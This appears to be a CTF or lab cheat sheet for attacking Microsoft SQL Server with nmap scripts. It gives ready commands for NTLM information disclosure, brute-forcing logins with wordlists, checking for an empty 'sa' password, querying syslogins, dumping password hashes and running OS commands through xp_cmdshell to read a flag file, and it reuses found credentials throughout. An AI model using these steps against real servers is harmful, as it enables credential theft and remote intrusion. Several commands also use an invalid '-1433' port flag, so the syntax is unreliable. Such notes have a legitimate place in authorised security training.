**MSSQL**: It is a Microsoft SQL
##### Identify MSSQL Database Server
```
nmap -sV IP
```

##### Find Info from the MSSQL Server with NTLM
```
# Discover Server Information
nmap -1433 --script ms-sql-info IP
```

Sending an MS-TDS NTLM authentication request with an invalid domain and null credentials will cause the remote service to respond with an NTLMSSP message disclosing information to include NetBIOS, DNS, and OS build version.
```
# NTLM script
nmap -1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433 IP
```

##### Brute Force the Username and the Password
```
nmap -1433 --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt IP
```

##### Identify `sa` User Password
The `sa` user is the default system administrator in Microsoft SQL Server (MSSQL). The `sa` account has full administrative rights.
```
# Checking Empty Password
nmap -1433 --script ms-sql-empty-password IP
```

##### Extract `sysusers` from MSSQL using 'query'
```
# We had username:password from previous enumeration
nmap -1433 --script ms-sql-query --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-query.query="select * from master..syslogins" IP -oN output.txt
```

##### Dump MSSQL Users Hashes
```
nmap -1433 --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=anamaria IP
```

##### Execute a Command on MSSQL to retrieve the flag
```
nmap -1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="type c:\flag.txt" IP
```